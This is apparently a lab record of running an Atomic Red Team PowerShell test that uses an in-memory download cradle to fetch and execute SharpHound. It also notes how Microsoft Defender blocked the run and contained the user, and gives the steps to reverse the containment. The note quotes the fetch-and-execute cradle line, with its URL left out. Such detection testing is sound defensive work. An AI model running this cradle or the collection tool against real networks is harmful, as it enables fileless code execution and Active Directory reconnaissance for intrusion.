# t1059.001 – powershell
## test-03 – run bloodhound from memory using download cradle

---

## objective

simulate adversary behaviour using an in-memory powershell download cradle to execute sharphound (bloodhound collection) without writing the script to disk.

technique:
- t1059.001 – powershell

---

## command executed

```powershell
invoke-atomictest t1059.001 -testnumbers 3
```
expected behaviour
the atomic test performs:

iex (new-object net.webclient).downloadstring(...)

retrieves sharphound script from github

executes script directly in memory

generates endpoint and network telemetry

expected artifacts:

powershell.exe execution

outbound https connection to github domain

amsi script inspection

possible defender alert

actual result
execution was blocked by microsoft defender.

observed:

trojan:powershell/sacepos.c detection

automatic attack disruption triggered

user containment applied

ntlm network logon blocked

bastion access denied

device was not isolated.

impact on lab
rdp/bastion access failed

live response session still functional

containment had to be manually reversed

recovery steps
defender → action center

locate "contain user" action

click undo

wait 60–90 seconds

bastion access restored

summary
defender prevented payload execution before sharphound download completed.
automatic attack disruption escalated response to user containment.
